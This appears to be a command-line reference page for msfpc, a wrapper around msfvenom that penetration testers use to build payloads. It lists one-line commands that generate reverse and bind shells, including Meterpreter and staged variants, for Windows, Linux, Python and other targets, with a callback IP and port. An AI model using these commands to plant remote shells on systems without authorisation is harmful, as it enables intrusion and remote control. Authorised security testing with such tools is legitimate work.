# TAGLINE

simplifies payload generation

# TLDR

**Generate Windows payload**

```msfpc windows [192.168.1.10]```

**Generate Linux payload**

```msfpc linux [192.168.1.10]```

**Generate with specific port**

```msfpc windows [192.168.1.10] [4444]```

**Generate Meterpreter payload**

```msfpc windows msf [192.168.1.10]```

**Generate staged reverse payload**

```msfpc windows staged reverse [192.168.1.10]```

**Generate Python payload**

```msfpc python [192.168.1.10]```

**Generate all payload types** for an IP

```msfpc loop [192.168.1.10]```

# SYNOPSIS

**msfpc** _type_ [_domain/ip_] [_port_] [_cmd/msf_] [_bind/reverse_] [_staged/stageless_] [_tcp/http/https/find_port_] [_batch/loop_] [_verbose_]

# PARAMETERS

_TYPE_
> Payload type: APK, ASP, ASPX, Bash, Java, Linux, OSX, Perl, PHP, Powershell, Python, Tomcat, or Windows.

_DOMAIN/IP_
> Target IP address, domain, or interface name (e.g. eth0). Use "wan" to auto-detect external IP.

_PORT_
> Port number (default: 443).

**cmd**
> Use standard native command prompt/terminal shell.

**msf**
> Use Meterpreter shell (default when available).

**bind**
> Open a port on the target for the attacker to connect to.

**reverse**
> Make the target connect back to the attacker (default).

**staged**
> Split payload into parts (smaller, requires Metasploit).

**stageless**
> Complete standalone payload (more stable).

**tcp** / **http** / **https**
> Protocol for the connection. TCP is default.

**batch**
> Generate all possible payloads for the given type.

**loop**
> Generate one payload of every type.

**verbose**
> Enable verbose output.

# DESCRIPTION

**msfpc** (MSFvenom Payload Creator) simplifies payload generation. It wraps msfvenom functionality.

The tool creates common payloads quickly. Generates handlers and multi-format outputs.

# CAVEATS

Authorized testing only. Requires Metasploit. Detection likely without encoding.

# HISTORY

msfpc was created to simplify **msfvenom payload** generation for penetration testers.

# SEE ALSO

[msfvenom](/man/msfvenom)(1), [msfconsole](/man/msfconsole)(1), [nmap](/man/nmap)(1)

